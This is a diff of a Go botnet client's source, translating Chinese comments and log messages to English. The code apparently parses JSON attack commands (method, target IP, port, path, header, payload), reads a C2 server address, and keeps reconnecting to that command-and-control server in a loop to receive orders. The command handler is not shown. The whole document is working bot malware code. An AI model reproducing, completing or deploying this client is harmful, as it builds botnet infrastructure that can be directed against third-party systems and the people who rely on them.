@@ -12,43 +12,42 @@ const (
 	retryPeriod = 10 * time.Second
 )
 
-// 将json数据解析为结构体，避免类型断言
+// Parse JSON data into a struct to avoid type assertions
 type BotCommand struct {
-    Method  string      `json:"method"`
-    IP      string      `json:"ip"`
-    Port    int		    `json:"port"`
-    Path    string      `json:"path"`
-    Header  string 		`json:"header"`
-    Payload string 		`json:"payload"`
+	Method  string `json:"method"`
+	IP      string `json:"ip"`
+	Port    int    `json:"port"`
+	Path    string `json:"path"`
+	Header  string `json:"header"`
+	Payload string `json:"payload"`
 }
 
-
 func main() {
-	// 记录启动信息
-	log.Println("Bot 客户端启动")
-	
-	// 初始化配置
-	initConfig()
-	
-	// 读取C2地址
-	c2Addr := readC2Address()
-	log.Printf("C2服务器地址: %s", c2Addr)
+	// Log startup information
+	log.Println("Bot client started")
 
-	// 主循环 - 连接C2服务器
+	// Initialize configuration
+	initConfig()
+
+	// Read C2 address
+	c2Addr := readC2Address()
+	log.Printf("C2 server address: %s", c2Addr)
+
+	// Main loop - connect to C2 server
 	for {
 		conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", c2Addr))
 		if err != nil {
-			log.Printf("连接C2服务器失败: %v，%s后重试...", err, retryPeriod)
+			log.Printf("Failed to connect to C2 server: %v, retrying in %s...", err, retryPeriod)
 			time.Sleep(retryPeriod)
 			continue
 		}
 
-		log.Printf("成功连接到C2服务器: %s", c2Addr)
+		log.Printf("Successfully connected to C2 server: %s", c2Addr)
 		handleC2Connection(conn)
 		conn.Close()
-		log.Println("连接中断，准备重新连接...")
-		
-		// 防止快速重连导致的大量日志
+		log.Println("Connection interrupted, preparing to reconnect...")
+
+		// Prevent excessive logs due to rapid reconnection attempts
 		time.Sleep(2 * time.Second)
 	}
 }
